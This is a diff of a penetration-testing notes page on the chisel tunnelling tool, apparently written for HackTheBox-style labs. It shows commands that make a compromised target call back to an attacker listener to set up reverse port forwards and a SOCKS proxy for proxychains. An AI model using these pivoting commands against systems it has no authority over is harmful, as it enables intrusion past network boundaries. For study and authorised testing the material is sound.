@@ -1,6 +1,6 @@
 ---
 tags:
-  - networking
+  - tool
   - routing
 ---
 # chisel
@@ -24,17 +24,17 @@ chisel server --socks5 -p 8050 --reverse
 Upload `chisel` or `chisel.exe` to target and run in `client` mode. The command `client 10.10.14.191:8050 R:socks` will reach out to our listener at `10.10.14.191:8050` and act as a SOCKS proxy, forwarding all of our traffic to its appropriate destination
 
 ```powershell
-# Listen on Kali 80, forward to localhost port 80 on client
+# Listen on Kali 80, forward to localhost port 80 on the target
 chisel client 10.10.14.191:8050 R:80:127.0.0.1:80
 
-# Listen on Kali 4444, forward to 10.10.10.240 port 80
+# Listen on Kali 4444, forward to 10.10.10.240 port 80 on the target
 chisel client 10.10.14.191:8050 R:4444:10.10.10.240:80
 
 # Create SOCKS5 listener on 1080 on Kali, proxy through client
 chisel client 10.10.14.191:8050 R:socks
 ```
 
-Change `/etc/proxychains4.conf`
+Modify `/etc/proxychains4.conf`
 
 ```bash
 # ... At the very bottom of the file, we set the ProxyList to only point to port 9999.
